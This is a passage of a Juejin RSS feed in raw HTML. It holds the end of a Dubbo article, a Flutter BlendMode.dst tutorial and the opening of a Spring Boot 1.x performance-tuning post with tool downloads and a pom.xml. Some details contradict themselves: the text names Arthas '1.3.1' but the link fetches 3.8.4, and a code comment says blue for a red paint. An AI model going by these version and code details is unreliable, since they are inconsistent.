java -jar dubbo-admin-server/target/dubbo-admin-server-0.1.0.jar
</code></pre>
<p><strong>功能特性：</strong></p>
<ul>
<li>服务查询</li>
<li>服务详情</li>
<li>路由规则配置</li>
<li>动态配置</li>
<li>服务测试</li>
</ul>
<h3 data-id="heading-40">10.2 日志监控</h3>
<pre><code class="hljs language-ini" lang="ini">&lt;logger <span class="hljs-attr">name</span>=<span class="hljs-string">"org.apache.dubbo"</span> level=<span class="hljs-string">"INFO"</span>/&gt;
&lt;logger <span class="hljs-attr">name</span>=<span class="hljs-string">"com.dubbo.demo"</span> level=<span class="hljs-string">"DEBUG"</span>/&gt;
</code></pre>
<h3 data-id="heading-41">10.3 链路追踪</h3>
<p>集成SkyWalking实现分布式追踪：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.skywalking<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>apm-toolkit-trace<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.16.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h2 data-id="heading-42">十一、总结</h2>
<p>Dubbo作为成熟的RPC框架，在企业级微服务架构中发挥着重要作用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学习一些常用的混合模式之BlendMode. dst]]></title>    <link>https://juejin.cn/post/7592882393251856427</link>    <guid>https://juejin.cn/post/7592882393251856427</guid>    <pubDate>2026-01-09T06:24:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592882393251856427" data-draft-id="7592921639464484906" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学习一些常用的混合模式之BlendMode. dst"/> <meta itemprop="keywords" content="Flutter,Android"/> <meta itemprop="datePublished" content="2026-01-09T06:24:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火柴就是我"/> <meta itemprop="url" content="https://juejin.cn/user/272334614705575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学习一些常用的混合模式之BlendMode. dst
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334614705575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火柴就是我
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:24:37.000Z" title="Fri Jan 09 2026 06:24:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>The source pixels are discarded, leaving the destination intact.</code></p>
<p>代码</p>
<pre><code class="hljs language-js" lang="js"> canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), <span class="hljs-title class_">Paint</span>());
    <span class="hljs-title class_">Paint</span> dstPaint = <span class="hljs-title class_">Paint</span>()..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>;
    dstPaint.<span class="hljs-property">style</span> = ui.<span class="hljs-property">PaintingStyle</span>.<span class="hljs-property">fill</span>;
    canvas.<span class="hljs-title function_">drawImageRect</span>(image1!, <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, image!.<span class="hljs-property">width</span>.<span class="hljs-title function_">toDouble</span>(), image!.<span class="hljs-property">height</span>.<span class="hljs-title function_">toDouble</span>()), <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width/<span class="hljs-number">2</span>, height/<span class="hljs-number">2</span>), dstPaint);


    <span class="hljs-keyword">var</span> srcPaint = <span class="hljs-title class_">Paint</span>()
      ..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>
      ..<span class="hljs-property">blendMode</span> = ui.<span class="hljs-property">BlendMode</span>.<span class="hljs-property">dst</span>; <span class="hljs-comment">// 源颜色：蓝色; // 混合模式</span>
    canvas.<span class="hljs-title function_">drawRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), srcPaint);

    canvas.<span class="hljs-title function_">restore</span>();
</code></pre>
<p>重叠部分只保留dst的内容,清空所有的src。非重叠部分只保留dst的内容,清空所有的src。所以效果就是图片全部展示,红色矩形全部不显示。</p>
<p>效果图如下：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a57585841b24cb99bb87bc998b9e874~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768544677&amp;x-signature=dl8T4K1ut0bQrLB6h3DT%2FfN1XBs%3D" alt="image.png" width="30%" loading="lazy"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 1.x 接口性能优化：从 3 秒到 200 毫秒的实战调优之路]]></title>    <link>https://juejin.cn/post/7593015632078897179</link>    <guid>https://juejin.cn/post/7593015632078897179</guid>    <pubDate>2026-01-09T05:56:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593015632078897179" data-draft-id="7592997693069246474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 1.x 接口性能优化：从 3 秒到 200 毫秒的实战调优之路"/> <meta itemprop="keywords" content="Java,Spring Boot"/> <meta itemprop="datePublished" content="2026-01-09T05:56:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="帅气的你"/> <meta itemprop="url" content="https://juejin.cn/user/1626932940649534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 1.x 接口性能优化：从 3 秒到 200 毫秒的实战调优之路
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1626932940649534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    帅气的你
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:56:52.000Z" title="Fri Jan 09 2026 05:56:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Spring Boot 1.x 接口性能优化：从 3 秒到 200 毫秒的实战调优之路</h2>
<h3 data-id="heading-1">前言：那个让老板差点把我开了的接口</h3>
<p>某年的年底，我们团队负责的电商订单查询接口突然成了"性能杀手"。线上高峰期，一个简单的订单查询接口响应时间直接飙到 3 秒，用户投诉电话打爆了客服，老板在周会上直接拍桌子："2 天内必须优化到 200ms 以内，否则这个项目组全部扣绩效！"</p>
<p>当时我整个人都懵了。这个接口之前明明跑得好好的，怎么突然就慢成这样了？更让人头疼的是，我们项目用的是 Spring Boot 1.5.22（因为历史原因，公司规定不能升级到 2.x），很多新版本的优化工具都用不了。</p>
<p><strong>⚠️ 版本风险提示：</strong> Spring Boot 1.x 已在 2019 年停止官方维护，若业务允许，优先评估升级到 2.x/3.x 的成本；若无法升级，需关注第三方依赖（如 Druid、Redis）的安全更新。本文所有配置和代码均基于 Spring Boot 1.5.22.RELEASE 验证可用。</p>
<p>但没办法，硬着头皮上吧。经过 2 天的疯狂调优，最终我们把接口响应时间从 3000ms 降到了 180ms，QPS 从 100 提升到了 1000，错误率从 5% 降到了 0.1%。</p>
<p>今天就把这次调优的完整过程分享出来，希望能帮到同样在 Spring Boot 1.x 项目中挣扎的兄弟们。</p>
<h3 data-id="heading-2">一、环境准备：调优前的必备工具清单</h3>
<p>在开始调优之前，先确保你的环境满足以下要求，避免在调优过程中因为工具版本不兼容而踩坑。</p>
<h4 data-id="heading-3">1.1 基础环境要求</h4>






























<table><thead><tr><th>工具/组件</th><th>版本要求</th><th>说明</th></tr></thead><tbody><tr><td><strong>JDK</strong></td><td>1.8u102+</td><td>Spring Boot 1.5.22 要求 JDK 8，建议使用 u102 及以上版本（修复了部分 GC Bug）</td></tr><tr><td><strong>Spring Boot</strong></td><td>1.5.22.RELEASE</td><td>本文所有配置基于此版本验证</td></tr><tr><td><strong>MySQL</strong></td><td>5.6 / 5.7</td><td>避免使用 MySQL 8.0（与 1.x 数据源可能存在兼容性问题）</td></tr><tr><td><strong>Redis</strong></td><td>3.2+</td><td>避免使用 Redis 6.0+（高版本可能有兼容性问题）</td></tr></tbody></table>
<h4 data-id="heading-4">1.2 诊断工具安装</h4>
<p><strong>Arthas 1.3.1（兼容 Spring Boot 1.x）：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载 Arthas 1.3.1（注意：不要用最新版，可能不兼容 1.x）</span>
wget https://github.com/alibaba/arthas/releases/download/arthas-all-3.8.4/arthas-boot.jar

<span class="hljs-comment"># 启动 Arthas（需要 Java 进程运行权限）</span>
java -jar arthas-boot.jar
<span class="hljs-comment"># 执行后会列出所有 Java 进程，输入进程号选择目标应用即可 attach</span>
</code></pre>
<p><strong>JVisualVM（JDK 自带）：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># JDK 8 自带，路径通常在：</span>
<span class="hljs-comment"># macOS: /Library/Java/JavaVirtualMachines/jdk1.8.0_xxx.jdk/Contents/Home/bin/jvisualvm</span>
<span class="hljs-comment"># Linux: $JAVA_HOME/bin/jvisualvm</span>
</code></pre>
<p><strong>JMeter（压测工具）：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载 JMeter 5.4.1（稳定版本）</span>
wget https://archive.apache.org/dist/jmeter/binaries/apache-jmeter-5.4.1.tgz
tar -xzf apache-jmeter-5.4.1.tgz
</code></pre>
<h4 data-id="heading-5">1.3 完整依赖清单（pom.xml）</h4>
<p>为了避免依赖冲突，这里提供完整的依赖清单：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.22.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- Spring Boot Web --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Spring Boot Actuator 1.x（监控） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Redis（注意：1.x 用 data-redis，不是 starter-redis） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.22.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- MyBatis --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Druid 连接池 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Caffeine Cache（本地缓存，性能优于 Guava Cache） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.ben-manes.caffeine<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>caffeine<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Guava（仅用于布隆过滤器，Caffeine 不提供布隆过滤器功能） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.google.guava<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>guava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>27.1-jre<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Prometheus 监控（兼容 1.x） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.micrometer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>micrometer-registry-prometheus<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        
        <span class="hljs-comment">&lt;!-- Commons Pool 2（对象池） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
